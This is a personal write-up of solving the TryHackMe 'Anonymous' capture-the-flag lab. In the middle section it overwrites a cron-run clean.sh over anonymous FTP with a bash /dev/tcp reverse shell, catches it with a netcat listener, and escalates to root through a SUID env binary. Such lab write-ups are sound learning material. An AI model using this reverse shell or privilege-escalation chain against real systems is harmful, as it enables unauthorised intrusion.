# Hack Log 3 - TryHackMe [Anonymous](https://tryhackme.com/room/anonymous)

📆:**Date:** 2025-05-25  
🔍**Objective:** Read the contents of user.txt and root.txt files  
🎯**Target**: TryHackme Anonymous (Lab CTF)  

---

## 🛠️ Actions Taken  

- **Port & Service Enumeration**
  ```
  nmap -sV -p<port>-<port> <IP>
  ```
  → Found common services on their ports.  
  → Found a smb share named as "pics".  
  → Mounted the smb share, share containes some dog pictures, analyzed the images, nothing useful.  
  → Discovered that the FTP has anonymous login and file write enabled.  

- **FTP File-Write**  
  → Logged in to the FTP service.  
  → Discovered a script `clean.sh`, a file `removed_files.log` and a note to self mentioning to "disable anonymous login to FTP".  
  → Analyzed the script and found that it deletes files and writes the result into the aforementioned .log file.  
  → Analyzed the log file, it contained repetitive log messages in new lines.
    ```
   Running cleanup script:  nothing to delete
   Running cleanup script:  nothing to delete
   Running cleanup script:  nothing to delete
   Running cleanup script:  nothing to delete
   ```   
  → After a while Re-downloaded the log file and script from FTP.  
  → Read the log file and found that the number of repetitive logging messages (number of lines) is greater than the previous log file.
   ```
   Running cleanup script:  nothing to delete
   Running cleanup script:  nothing to delete
   Running cleanup script:  nothing to delete
   Running cleanup script:  nothing to delete
   Running cleanup script:  nothing to delete
   Running cleanup script:  nothing to delete
   Running cleanup script:  nothing to delete  
   ```
  → Deduced that there must be a cron job running the `clean.sh` script in intervals of time, hence the varying log entries in the two log files obtained in different points of time.  
  → Created another script named as `clean.sh` in the local system which spawns a reverse shell.
    ```
    bash -i >& /dev/tcp/<MACHINE_IP>/4444 0>&1
    ```
  → Uploaded the modified `clean.sh` containing the reverse shell via FTP to the victim machine.  
  → Started a netcat listener on the local machine.
    ```
    nc -lvnp 4444
    ```  
  → Succesfully received a reverse shell.


- **Post-Exploitation**
  → The reverse shell obtained was unstable therefore stabilized it.
    - 1. Victim machine
      ```
      /usr/bin/script -qc /bin/bash /dev/null
      CTRL+Z
      ```
    - 2. Attacker machine
      ```
      stty raw -echo
      fg
      ENTER
      ENTER
      ```
    - 3. Victim Machine
      ```
      export TERM=xterm
      stty cols 132 rows 34
      ```
  → Found `user.txt` file in the home directory and obtained the flag 1.

- **Privilege Escalation**
  → Searched for any binary with suid bit set.
    ```
    find / -type f -perm -4000 2>/dev/null
    ```
  → Found a binary called `env` with suid bit set.
  → Searched for its corresponding entry in [GTFO Bins](https://gtfobins.github.io/gtfobins/env/).
  → Executed the following
    ```
    env /bin/sh -p
    ```
  → Succesfully obtained the root shell and obtained the final flag from root.txt.


## 🔍 Key Findings  

→ FTP with anonymous login and file write enabled.  
→ Cron job executing the script in regular intervals.  

## 📚 What I Learned  

→ FTP with anonymous login and file write can be a goldmine.  
→ SMB shares can also be useful, its good to check and enumerate them.  
→ Reiterating, rethinking on the steps and seeking help/hints(no cheating) can be very very helpful if getting stuck.  
→ In this case, redownloading and reviewing the log file revealed that there might be a cron job running the script, this information was critical in successful exploitation.    


  
   
   
      
  
  
